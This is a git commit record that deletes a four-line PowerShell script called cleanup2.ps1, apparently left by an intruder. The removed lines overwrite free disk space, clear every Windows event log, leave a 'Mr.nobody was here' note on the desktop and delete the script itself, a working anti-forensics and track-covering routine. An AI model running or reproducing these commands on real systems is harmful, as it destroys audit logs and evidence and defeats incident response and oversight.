fe44ddf48b5a9b6ba878338e62b2131337ffa22c
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-11-29 09:51:29 +0000

    Delete cleanup2.ps1

--- cleanup2.ps1
+++
@@ -1,4 +0,0 @@
-cipher /w:c:\
-wevtutil el | Foreach-Object {wevtutil cl "$_"}
-Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here"
-Remove-Item -Path $MyInvocation.MyCommand.Source -Force
